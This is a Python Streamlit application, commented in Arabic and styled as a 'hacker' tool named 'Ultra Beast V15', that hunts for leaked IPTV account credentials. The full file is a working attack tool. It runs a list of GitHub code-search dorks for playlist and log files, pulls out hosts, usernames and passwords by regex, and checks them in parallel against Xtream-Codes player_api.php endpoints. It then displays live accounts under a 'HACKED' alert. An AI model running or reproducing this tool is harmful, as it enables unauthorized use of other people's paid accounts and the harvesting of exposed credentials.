import streamlit as st
import requests
import re
import time
import random
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

# =================================================
# 1. إعدادات الأمان
# =================================================
LOGIN_PASSWORD = "BEAST_V15_USER"

def check_password():
    if "password_correct" not in st.session_state:
        st.session_state.password_correct = False
    if st.session_state.password_correct:
        return True

    st.markdown("<h2 style='text-align: center; color: #00ff41;'>🔐 ULTRA BEAST V15 - LOGIN</h2>", unsafe_allow_html=True)
    pwd = st.text_input("أدخل كلمة المرور:", type="password")
    if st.button("دخول Access"):
        if pwd == LOGIN_PASSWORD:
            st.session_state.password_correct = True
            st.rerun()
        else:
            st.error("❌ Access Denied!")
    return False

if not check_password():
    st.stop()

# =================================================
# 2. إعدادات الواجهة (Dark & Hacker Style)
# =================================================
st.set_page_config(page_title="Ultra Beast V15", layout="wide", page_icon="🌪️")

st.markdown("""
<style>
    .stApp { background-color: #050505; }
    div.stButton > button {
        background-color: #00ff41; color: black; font-weight: bold; border: none;
    }
    div.stButton > button:hover {
        background-color: #00cc33; color: white;
    }
    .card {
        background: linear-gradient(145deg, #111, #1a1a1a);
        border: 1px solid #333;
        border-right: 5px solid #00ff41;
        padding: 15px;
        border-radius: 8px;
        margin-bottom: 10px;
        animation: fadeIn 0.5s;
    }
    .host-text { color: #00ff41; font-weight: bold; font-family: 'Consolas', monospace; font-size: 1.2em; }
    .info-row { display: flex; justify-content: space-between; margin-top: 5px; color: #ccc; font-size: 0.9em; }
    .val { color: #fff; font-weight: bold; }
    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
</style>
""", unsafe_allow_html=True)

# =================================================
# 3. إدارة الحالة (State Management)
# =================================================
if 'results' not in st.session_state: st.session_state.results = []
if 'is_hunting' not in st.session_state: st.session_state.is_hunting = False
if 'checked_count' not in st.session_state: st.session_state.checked_count = 0
# إضافة مخزن لمنع التكرار (يخزن Host+User)
if 'seen_combos' not in st.session_state: st.session_state.seen_combos = set()

# =================================================
# 4. قائمة الدروكات المليونية (Expanded Dorks)
# =================================================
DORKS_LIST = [
    'extension:m3u "http://*username="',
    'filename:iptv.m3u',
    'extension:txt "player_api.php"',
    'extension:json "iptv_server"',
    'extension:cfg "iptv"',
    'filename:tv_channels.m3u',
    'extension:m3u8 "username=" "password="',
    'path:etc/enigma2/ "http"',
    '"get.php?username=" extension:txt',
    '"xtream-codes" extension:txt',
    'filename:playlist.m3u8',
    'extension:ini "iptv"',
    'extension:log "username=" "password=" http',
    'filename:smartiptv.txt'
]

# =================================================
# 5. محرك الفحص والفلترة
# =================================================

def check_account(data_tuple):
    host, user, pw = data_tuple
    
    # 1. فحص التكرار قبل الاتصال بالسيرفر
    combo_key = f"{host}|{user}"
    if combo_key in st.session_state.seen_combos:
        return None # تم فحصه مسبقاً
    
    # إضافته للمخزن حتى لو لم يعمل (لتجنب إعادة فحصه)
    st.session_state.seen_combos.add(combo_key)
    
    try:
        # تنظيف الرابط
        if not host.startswith("http"): host = "http://" + host
        if host.endswith("/"): host = host[:-1]
        
        url = f"{host}/player_api.php?username={user}&password={pw}"
        r = requests.get(url, timeout=4).json()
        
        if r.get("user_info", {}).get("status") == "Active":
            info = r["user_info"]
            exp_ts = info.get('exp_date')
            
            # تحويل التاريخ
            if exp_ts:
                try:
                    exp = datetime.fromtimestamp(int(exp_ts)).strftime('%Y-%m-%d')
                except: exp = "Unlimited"
            else:
                exp = "Unlimited"
                
            active_cons = info.get('active_cons', 0)
            max_cons = info.get('max_connections', 0)
            
            return {
                "host": host, 
                "user": user, 
                "pass": pw, 
                "exp": exp, 
                "conn": f"{active_cons}/{max_cons}"
            }
    except:
        pass
    return None

# =================================================
# 6. الواجهة الجانبية (Control Panel)
# =================================================
with st.sidebar:
    st.title("🌪️ BEAST V15")
    st.markdown("---")
    token = st.text_input("GitHub Token (هام جداً):", type="password")
    
    col1, col2 = st.columns(2)
    with col1:
        if st.button("🔥 بدء الهجوم", use_container_width=True):
            if token: st.session_state.is_hunting = True
            else: st.warning("يجب وضع التوكن!")
    with col2:
        if st.button("🛑 إيقاف", use_container_width=True):
            st.session_state.is_hunting = False
            
    st.markdown("---")
    st.metric("🔍 إجمالي الفحص", st.session_state.checked_count)
    st.metric("💎 هيتات جديدة", len(st.session_state.results))
    st.caption(f"💾 قاعدة البيانات: {len(st.session_state.seen_combos)} سجل فريد")

# =================================================
# 7. محرك التشغيل الرئيسي
# =================================================

# منطقة النتائج
results_container = st.container()

def render_results():
    with results_container:
        if not st.session_state.results:
            st.info("بانتظار البيانات... اضغط بدء الهجوم")
        for res in st.session_state.results:
            st.markdown(f"""
            <div class="card">
                <div style="display:flex; justify-content:space-between; align-items:center;">
                    <span class="host-text">{res['host']}</span>
                    <span style="background:#00ff41; color:black; padding:2px 8px; border-radius:4px; font-weight:bold;">ACTIVE</span>
                </div>
                <hr style="border-color:#333; margin:8px 0;">
                <div class="info-row">
                    <div>👤 <span class="val">{res['user']}</span></div>
                    <div>🔑 <span class="val">{res['pass']}</span></div>
                </div>
                <div class="info-row">
                    <div>📅 Exp: <span class="val" style="color:#ffcc00;">{res['exp']}</span></div>
                    <div>🔌 Conn: <span class="val">{res['conn']}</span></div>
                </div>
            </div>
            """, unsafe_allow_html=True)

# المنطق الخلفي
if st.session_state.is_hunting:
    headers = {'Authorization': f'token {token}'}
    status_msg = st.empty()
    
    # خلط الدروكات لضمان نتائج عشوائية كل مرة
    random.shuffle(DORKS_LIST)
    
    for dork in DORKS_LIST:
        if not st.session_state.is_hunting: break
        
        # البحث في أول 3 صفحات لكل دورك (للتنوع)
        for page in range(1, 4):
            if not st.session_state.is_hunting: break
            
            status_msg.info(f"⚡ جاري المسح: {dork} | صفحة {page}")
            
            try:
                api_url = f"https://api.github.com/search/code?q={dork}&per_page=30&page={page}"
                response = requests.get(api_url, headers=headers)
                
                # التعامل مع حظر الـ API
                if response.status_code == 403 or response.status_code == 429:
                    status_msg.warning("⚠️ Github Rate Limit! انتظار 10 ثواني...")
                    time.sleep(10)
                    continue
                
                data = response.json()
                
                candidates = []
                
                # استخراج الروابط من الملفات
                if 'items' in data:
                    for item in data['items']:
                        try:
                            # جلب المحتوى الخام
                            raw_url = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
                            content = requests.get(raw_url, timeout=5).text
                            
                            # Regex قوي جداً لالتقاط جميع الأنماط
                            # يلتقط http/https والبورات واليوزر والباسورد
                            pattern = r'(https?://[a-zA-Z0-9\.-]+(?::\d+)?).*?[?&]username=([a-zA-Z0-9\._-]+)&password=([a-zA-Z0-9\._-]+)'
                            matches = re.findall(pattern, content)
                            
                            for m in matches:
                                candidates.append(m)
                        except: continue
                
                # تشغيل التيربو (فحص متوازي)
                if candidates:
                    status_msg.text(f"🚀 جاري فحص {len(candidates)} سيرفر في الخلفية...")
                    st.session_state.checked_count += len(candidates)
                    
                    with ThreadPoolExecutor(max_workers=20) as executor:
                        # إرسال المهام
                        futures = [executor.submit(check_account, c) for c in candidates]
                        
                        for future in as_completed(futures):
                            result = future.result()
                            if result:
                                st.session_state.results.insert(0, result)
                                st.toast(f"HACKED: {result['host']}", icon="✅")
                    
                    # تحديث الشاشة بعد انتهاء المجموعة
                    render_results()
                    
            except Exception as e:
                pass
            
            time.sleep(1) # استراحة بسيطة
            
    st.session_state.is_hunting = False
    status_msg.success("✅ انتهت دورة البحث الكاملة")
    render_results()

else:
    # وضع الخمول (عرض النتائج فقط)
    render_results()
